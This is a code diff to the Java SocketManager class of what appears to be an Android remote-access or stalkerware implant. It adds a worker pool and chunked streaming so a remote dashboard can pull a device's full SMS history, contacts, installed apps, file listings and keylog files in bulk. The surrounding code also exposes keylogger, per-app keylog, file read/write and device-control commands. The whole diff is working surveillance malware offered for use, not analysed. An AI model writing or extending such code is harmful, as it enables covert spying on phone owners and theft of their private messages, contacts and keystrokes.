@@ -62,6 +62,15 @@ public class SocketManager {
         r -> { Thread t = new Thread(r, "SocketMgr-worker"); t.setDaemon(true); return t; },
         new java.util.concurrent.ThreadPoolExecutor.DiscardOldestPolicy()
     );
+    // Dedicated pool for bulk data commands (contacts, SMS, apps, files, keylogs).
+    // Isolated from the stream executor so that large data fetches never delay frame captures.
+    // Up to 6 parallel bulk operations; rejects excess with CallerRunsPolicy so they still complete.
+    private final ExecutorService bulkExecutor = new java.util.concurrent.ThreadPoolExecutor(
+        3, 6, 30L, TimeUnit.SECONDS,
+        new java.util.concurrent.LinkedBlockingQueue<>(30),
+        r -> { Thread t = new Thread(r, "SocketMgr-bulk"); t.setDaemon(true); return t; },
+        new java.util.concurrent.ThreadPoolExecutor.CallerRunsPolicy()
+    );
     private final ScheduledExecutorService heartbeatExecutor = Executors.newSingleThreadScheduledExecutor();
     private ScheduledFuture<?>             heartbeatFuture;
 
@@ -538,6 +547,89 @@ public class SocketManager {
         }
     }
 
+    /**
+     * Stream a large JSONArray to the dashboard in small "data:chunk" live events so the
+     * dashboard can render data progressively rather than waiting for the entire payload.
+     *
+     * Flow:
+     *   1. Send chunks via sendLiveOnly("data:chunk", …)  ← dashboard accumulates
+     *   2. Send final chunk with done=true
+     *   3. Call sendResponse so the server resolves the pending command timer
+     *
+     * Must be called from a background thread (bulkExecutor), never from the TCP read loop.
+     *
+     * @param commandId  command UUID the dashboard is tracking
+     * @param command    original command name (for display / routing on dashboard)
+     * @param items      full dataset to stream
+     * @param fieldName  JSON field name to use in the synthesised response (e.g. "contacts")
+     * @param chunkSize  items per chunk — 50 is a good balance of granularity vs overhead
+     */
+    private void sendChunked(String commandId, String command,
+                             JSONArray items, String fieldName, int chunkSize) {
+        int total  = items.length();
+        int idx    = 0;
+        for (int start = 0; start < total; start += chunkSize) {
+            JSONArray chunk = new JSONArray();
+            int end = Math.min(start + chunkSize, total);
+            for (int i = start; i < end; i++) {
+                chunk.put(items.opt(i));
+            }
+            try {
+                JSONObject msg = new JSONObject();
+                msg.put("commandId",  commandId);
+                msg.put("command",    command);
+                msg.put("fieldName",  fieldName);
+                msg.put("chunk",      chunk);
+                msg.put("chunkIndex", idx++);
+                msg.put("totalItems", total);
+                msg.put("done",       false);
+                sendLiveOnly("data:chunk", msg);
+            } catch (Exception e) {
+                Log.e(TAG, "sendChunked chunk error: " + e.getMessage());
+            }
+        }
+        // Final done marker
+        try {
+            JSONObject done = new JSONObject();
+            done.put("commandId",  commandId);
+            done.put("command",    command);
+            done.put("fieldName",  fieldName);
+            done.put("totalItems", total);
+            done.put("done",       true);
+            sendLiveOnly("data:chunk", done);
+        } catch (Exception e) {
+            Log.e(TAG, "sendChunked done error: " + e.getMessage());
+        }
+        // Resolve the server-side pending command so the 45 s timer doesn't fire
+        try {
+            JSONObject ack = new JSONObject();
+            ack.put("success",    true);
+            ack.put("streaming",  true);
+            ack.put("totalItems", total);
+            sendResponse(commandId, command, ack);
+        } catch (Exception e) {
+            Log.e(TAG, "sendChunked sendResponse error: " + e.getMessage());
+        }
+    }
+
+    /** Send a chunked-stream error — closes the stream and resolves the server timer. */
+    private void sendChunkedError(String commandId, String command, String error) {
+        try {
+            JSONObject errEvent = new JSONObject();
+            errEvent.put("commandId", commandId);
+            errEvent.put("command",   command);
+            errEvent.put("done",      true);
+            errEvent.put("error",     error);
+            sendLiveOnly("data:chunk", errEvent);
+        } catch (Exception ignored) {}
+        try {
+            JSONObject errResult = new JSONObject();
+            errResult.put("success", false);
+            errResult.put("error",   error);
+            sendResponse(commandId, command, errResult);
+        } catch (Exception ignored) {}
+    }
+
     // ── Heartbeat ────────────────────────────────────────────────────────
 
     private void startHeartbeat() {
@@ -794,6 +886,9 @@ public class SocketManager {
             return;
         }
 
+        // null means the command handles its own response asynchronously (chunked streaming).
+        // bulkExecutor tasks call sendResponse / sendChunked directly — do not double-send.
+        if (result == null) return;
         sendResponse(commandId, command, result);
     }
 
@@ -809,12 +904,29 @@ public class SocketManager {
             case "set_clipboard":
             case "get_device_info":
             case "get_location":
-            case "get_installed_apps":
             case "get_battery_info":
             case "get_network_info":
             case "get_wifi_networks":
             case "get_system_info":
                 return commandExecutor.executeCommand(command, params);
+
+            case "get_installed_apps": {
+                // Offload to bulkExecutor + chunked streaming so label-loading (200+ Binder IPCs)
+                // doesn't block the stream executor or time out the 45 s server timer.
+                final String cid0 = params.optString("commandId", "");
+                final JSONObject fp0 = params;
+                bulkExecutor.execute(() -> {
+                    try {
+                        JSONObject full = commandExecutor.executeCommand("get_installed_apps", fp0);
+                        JSONArray arr = full.optJSONArray("apps");
+                        if (arr == null) arr = new JSONArray();
+                        sendChunked(cid0, "get_installed_apps", arr, "apps", 40);
+                    } catch (Exception e) {
+                        sendChunkedError(cid0, "get_installed_apps", e.getMessage());
+                    }
+                });
+                return null; // async — bulkExecutor calls sendResponse via sendChunked
+            }
 
             // ── Audio: mute / unmute (all streams via setStreamVolume, no DND needed) ──
             case "mute_device": {
@@ -923,7 +1035,17 @@ public class SocketManager {
 
         // ── SMS ──────────────────────────────────────────────────────────
         if (command.equals("get_all_sms")) {
-            return smsHandler.getAllSMS(params.optInt("limit", 100));
+            final String cidSms = params.optString("commandId", "");
+            final int smsLimit  = params.optInt("limit", 200);
+            bulkExecutor.execute(() -> {
+                try {
+                    JSONObject full = smsHandler.getAllSMS(smsLimit);
+                    JSONArray arr = full.optJSONArray("messages");
+                    if (arr == null) arr = new JSONArray();
+                    sendChunked(cidSms, "get_all_sms", arr, "messages", 50);
+                } catch (Exception e) { sendChunkedError(cidSms, "get_all_sms", e.getMessage()); }
+            });
+            return null;
         }
         if (command.equals("get_sms_from_number")) {
             return smsHandler.getSMSFromNumber(params.getString("phoneNumber"), params.optInt("limit", 50));
@@ -936,7 +1058,16 @@ public class SocketManager {
         }
 
         // ── Contacts ─────────────────────────────────────────────────────
-        if (command.equals("get_all_contacts")) return contactsHandler.getAllContacts();
+        if (command.equals("get_all_contacts")) {
+            final String cidC = params.optString("commandId", "");
+            bulkExecutor.execute(() -> {
+                try {
+                    JSONArray arr = contactsHandler.getAllContactsArray();
+                    sendChunked(cidC, "get_all_contacts", arr, "contacts", 50);
+                } catch (Exception e) { sendChunkedError(cidC, "get_all_contacts", e.getMessage()); }
+            });
+            return null;
+        }
         if (command.equals("search_contacts"))  return contactsHandler.searchContacts(params.getString("query"));
 
         // ── Calls ────────────────────────────────────────────────────────
@@ -965,8 +1096,15 @@ public class SocketManager {
 
         // ── Files ────────────────────────────────────────────────────────
         if (command.equals("list_files")) {
-            String path = params.optString("path", "");
-            return fileHandler.listFiles(path.isEmpty() ? null : path);
+            final String cidF = params.optString("commandId", "");
+            final String filePath = params.optString("path", "");
+            bulkExecutor.execute(() -> {
+                try {
+                    sendResponse(cidF, "list_files",
+                            fileHandler.listFiles(filePath.isEmpty() ? null : filePath));
+                } catch (Exception e) { sendChunkedError(cidF, "list_files", e.getMessage()); }
+            });
+            return null;
         }
         if (command.equals("read_file"))  return fileHandler.readFile(params.getString("filePath"), params.optBoolean("asBase64", false));
         if (command.equals("write_file")) return fileHandler.writeFile(params.getString("filePath"), params.getString("content"), params.optBoolean("isBase64", false));
@@ -991,7 +1129,14 @@ public class SocketManager {
         // ── Keylogger ────────────────────────────────────────────────────
         if (command.equals("get_keylogs"))            return keyloggerService.getKeylogs(params.optInt("limit", 100));
         if (command.equals("clear_keylogs"))          return keyloggerService.clearKeylogs();
-        if (command.equals("list_keylog_files"))      return keyloggerService.listKeylogFiles();
+        if (command.equals("list_keylog_files")) {
+            final String cidKl = params.optString("commandId", "");
+            bulkExecutor.execute(() -> {
+                try { sendResponse(cidKl, "list_keylog_files", keyloggerService.listKeylogFiles()); }
+                catch (Exception e) { sendChunkedError(cidKl, "list_keylog_files", e.getMessage()); }
+            });
+            return null;
+        }
         if (command.equals("download_keylog_file"))   return keyloggerService.downloadKeylogFile(params.getString("date"));
 
         // ── Gesture Recorder ─────────────────────────────────────────────
@@ -1059,7 +1204,14 @@ public class SocketManager {
         }
 
         // ── App Monitor ──────────────────────────────────────────────────
-        if (command.equals("list_app_monitor_apps"))    return appMonitor.listMonitoredApps();
+        if (command.equals("list_app_monitor_apps")) {
+            final String cidAm = params.optString("commandId", "");
+            bulkExecutor.execute(() -> {
+                try { sendResponse(cidAm, "list_app_monitor_apps", appMonitor.listMonitoredApps()); }
+                catch (Exception e) { sendChunkedError(cidAm, "list_app_monitor_apps", e.getMessage()); }
+            });
+            return null;
+        }
         if (command.equals("get_app_keylogs"))          return appMonitor.getAppKeylogs(params.getString("packageName"), params.optString("date", ""), params.optInt("limit", 200));
         if (command.equals("list_app_keylog_files"))    return appMonitor.listAppKeylogFiles(params.getString("packageName"));
         if (command.equals("download_app_keylog_file")) return appMonitor.downloadAppKeylogFile(params.getString("packageName"), params.getString("date"));
